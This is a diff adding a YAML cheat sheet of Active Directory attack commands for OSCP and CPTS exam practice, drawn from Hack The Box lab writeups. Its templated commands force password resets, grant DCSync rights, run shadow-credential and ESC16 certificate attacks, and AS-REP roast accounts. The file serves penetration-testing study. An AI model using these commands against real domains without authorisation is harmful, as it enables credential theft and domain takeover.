@@ -1,0 +1,65 @@
+category: "writeup-techniques"
+description: "Attack techniques extracted from TJ Null HTB writeups"
+commands:
+  - name: "bloodyad-add-group"
+    description: "Add user to AD group via bloodyAD (requires Account Operators or GenericAll)"
+    command: "bloodyAD -u {USER} -p '{PASSWORD}' -d {DOMAIN} --host {IP} add groupMember '{GROUP}' {USER}"
+    tool: "bloodyAD"
+    tags: ["ad", "acl", "group", "bloodhound", "escalation"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "From HTB Forest — Account Operators → Exchange Windows Permissions → WriteDacl"
+
+  - name: "bloodyad-force-password"
+    description: "Force change a user's password via bloodyAD (requires ForceChangePassword)"
+    command: "bloodyAD -u {USER} -p '{PASSWORD}' -d {DOMAIN} --host {IP} set password TARGET 'NewPass123!'"
+    tool: "bloodyAD"
+    tags: ["ad", "acl", "password", "bloodhound", "escalation"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "From HTB Forest — ForceChangePassword ACL allows resetting without knowing old password"
+
+  - name: "dacledit-dcsync"
+    description: "Grant DCSync rights via WriteDacl using impacket-dacledit"
+    command: "impacket-dacledit -action write -rights DCSync -principal {USER} -target-dn 'DC=YOURDOMAIN,DC=LOCAL' {DOMAIN}/{USER}:'{PASSWORD}'"
+    tool: "impacket"
+    tags: ["ad", "acl", "dcsync", "writedacl", "escalation"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "From HTB Forest — grants DS-Replication-Get-Changes + Get-Changes-All"
+
+  - name: "certipy-shadow-auto"
+    description: "Shadow Credentials attack — extract RC4 hash via GenericWrite"
+    command: "certipy-ad shadow auto -username {USER}@{DOMAIN} -password '{PASSWORD}' -account TARGET_USER"
+    tool: "certipy"
+    tags: ["ad", "adcs", "shadow", "credentials", "genericwrite"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "From HTB Fluffy — GenericWrite over target → shadow credentials → RC4 hash"
+
+  - name: "certipy-esc16"
+    description: "ESC16 ADCS attack — UPN spoofing for admin certificate"
+    command: "certipy-ad account update -username {USER}@{DOMAIN} -p '{PASSWORD}' -user TARGET -upn administrator"
+    tool: "certipy"
+    tags: ["ad", "adcs", "esc16", "upn", "certificates"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "From HTB Fluffy — change UPN → request cert → revert UPN → authenticate as admin"
+
+  - name: "username-anarchy"
+    description: "Generate AD username permutations from full names"
+    command: "username-anarchy -i names.txt > generated_users.txt"
+    tool: "username-anarchy"
+    tags: ["enum", "username", "ad", "generation"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "From HTB Sauna — employee names from website → AD username formats"
+
+  - name: "nxc-ldap-asrep-anon"
+    description: "AS-REP roast via anonymous LDAP bind (no credentials needed)"
+    command: "nxc ldap {IP} -u '' -p '' --asreproast loot/asrep_anon.txt"
+    tool: "netexec"
+    tags: ["ad", "ldap", "asrep", "anonymous", "roast"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "From HTB Forest — anonymous LDAP bind + AS-REP roast in one command"
